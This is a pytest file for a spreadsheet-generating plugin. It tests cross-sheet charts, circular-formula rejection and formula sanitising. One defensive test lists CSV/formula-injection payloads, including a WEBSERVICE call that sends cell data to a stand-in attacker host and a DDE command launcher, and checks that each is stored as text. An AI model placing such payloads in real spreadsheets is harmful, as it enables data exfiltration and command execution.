import importlib.util
import json
from pathlib import Path

import pytest

PLUGIN = Path(__file__).resolve().parents[1] / "hermeshq" / "plugin_templates" / "hermeshq_xlsx" / "__init__.py"
DATOS = {
    "name": "Datos",
    "headers": ["Zona", "Ventas"],
    "rows": [["Norte", 120], ["Sur", 95], ["Centro", 150], ["Este", 80]],
}


@pytest.fixture
def plugin(tmp_path, monkeypatch):
    pytest.importorskip("openpyxl")
    monkeypatch.setenv("HERMES_SESSION_CWD", str(tmp_path))
    spec = importlib.util.spec_from_file_location("hq_xlsx_prueba_otra_hoja", PLUGIN)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def _generar(plugin, hojas):
    return json.loads(plugin._handle_generate_xlsx({"title": "Prueba", "sheets": hojas}))


def _resumen(formulas, charts=None):
    hoja = {"name": "Resumen", "headers": ["Métrica", "Valor"], "rows": [[k, v] for k, v in formulas]}
    if charts:
        hoja["charts"] = charts
    return hoja


FORMULAS_BUENAS = [
    ("Total", "=SUM(Datos!B2:B5)"),
    ("Promedio", "=AVERAGE(Datos!B2:B5)"),
    ("Máximo", "=MAX(Datos!B2:B5)"),
]


class TestGraficoDeOtraHoja:
    def test_el_grafico_de_resumen_usa_los_datos_de_la_otra_hoja(self, plugin):
        grafico = {
            "type": "bar",
            "title": "Ventas por Zona",
            "category_column": "Zona",
            "series": ["Ventas"],
            "data_sheet": "Datos",
        }
        r = _generar(plugin, [DATOS, _resumen(FORMULAS_BUENAS, [grafico])])
        assert r["success"] is True, r
        assert r["graficos"][0]["hoja"] == "Resumen" and r["graficos"][0]["series"] == ["Ventas"]
        import openpyxl

        ws = openpyxl.load_workbook(r["path"])["Resumen"]
        assert len(ws._charts) == 1
        referencia = ws._charts[0].series[0].val.numRef.f
        assert "Datos" in referencia and "$B$" in referencia
        assert ws["B2"].value == "=SUM(Datos!B2:B5)"

    def test_la_hoja_de_datos_puede_venir_despues(self, plugin):
        grafico = {"type": "column", "category_column": "Zona", "data_sheet": "datos"}
        r = _generar(plugin, [_resumen(FORMULAS_BUENAS, [grafico]), DATOS])
        assert r["success"] is True, r

    def test_data_sheet_inexistente_dice_las_hojas(self, plugin):
        r = _generar(plugin, [DATOS, _resumen(FORMULAS_BUENAS, [{"type": "bar", "data_sheet": "Nada"}])])
        assert r["success"] is False and "Nada" in r["error"] and "Datos" in r["error"]

    def test_control_negativo_sin_data_sheet_el_grafico_sigue_usando_su_hoja(self, plugin):
        r = _generar(plugin, [{**DATOS, "charts": [{"type": "bar", "category_column": "Zona", "series": ["Ventas"]}]}])
        assert r["success"] is True and r["graficos"][0]["hoja"] == "Datos"

    def test_control_negativo_el_grafico_propio_de_resumen_sin_numeros_sigue_fallando(self, plugin):
        r = _generar(plugin, [DATOS, _resumen(FORMULAS_BUENAS, [{"type": "bar", "series": ["Ventas"]}])])
        assert r["success"] is False


class TestFormulaCircular:
    @pytest.mark.parametrize("formula", ["=SUM(B2:B5)", "=AVERAGE(B2:B5)", "=MAX($B$2:$B$5)", "=B2+1", "=SUM(A1:C9)"])
    def test_rechaza_la_formula_que_se_incluye_a_si_misma(self, plugin, formula):
        r = _generar(plugin, [DATOS, _resumen([("Total", formula)])])
        assert r["success"] is False
        assert "referencia circular" in r["error"] and "Datos!B2:B5" in r["error"]

    @pytest.mark.parametrize(
        "formula", ["=SUM(Datos!B2:B5)", "=SUM(B2:B4)", "=A2", "=SUM('Datos'!B2:B5)", "=ROUND(B3/2,0)"]
    )
    def test_acepta_las_que_no_se_incluyen(self, plugin, formula):
        filas = [("Base", 10), ("Otra", 5), ("Y", 1), ("Total", formula)]
        r = _generar(plugin, [DATOS, _resumen(filas)])
        assert r["success"] is True, r


class TestFormulasReales:
    def _celdas(self, plugin, formulas):
        r = _generar(plugin, [DATOS, _resumen(formulas)])
        assert r["success"] is True, r
        import openpyxl

        return openpyxl.load_workbook(r["path"])["Resumen"]

    def test_la_formula_segura_es_una_formula_real(self, plugin):
        ws = self._celdas(plugin, FORMULAS_BUENAS)
        assert [ws[f"B{i}"].data_type for i in (2, 3, 4)] == ["f", "f", "f"]

    def test_se_calcula_al_abrir(self, plugin):
        ws = self._celdas(plugin, [("Total", "=SUM(Datos!B2:B5)")])
        assert ws["B2"].value == "=SUM(Datos!B2:B5)" and ws["B2"].data_type == "f"

    @pytest.mark.parametrize(
        "peligrosa",
        [
            '=WEBSERVICE("https://atacante.example/?d="&A2)',
            '=HYPERLINK("https://x","clic")',
            "=cmd|' /C calc'!A0",
            "=SUM([libro.xlsx]Hoja1!A1:A3)",
            '=INDIRECT("A1")',
            "=@SUM(A1:A2)",
        ],
    )
    def test_control_negativo_las_peligrosas_siguen_como_texto(self, plugin, peligrosa):
        ws = self._celdas(plugin, [("X", peligrosa)])
        assert ws["B2"].data_type == "s"

    def test_los_encabezados_nunca_son_formulas(self, plugin):
        r = _generar(plugin, [{"name": "H", "headers": ["=SUM(1,2)", "b"], "rows": [[1, 2]]}])
        import openpyxl

        assert openpyxl.load_workbook(r["path"])["H"]["A1"].data_type == "s"
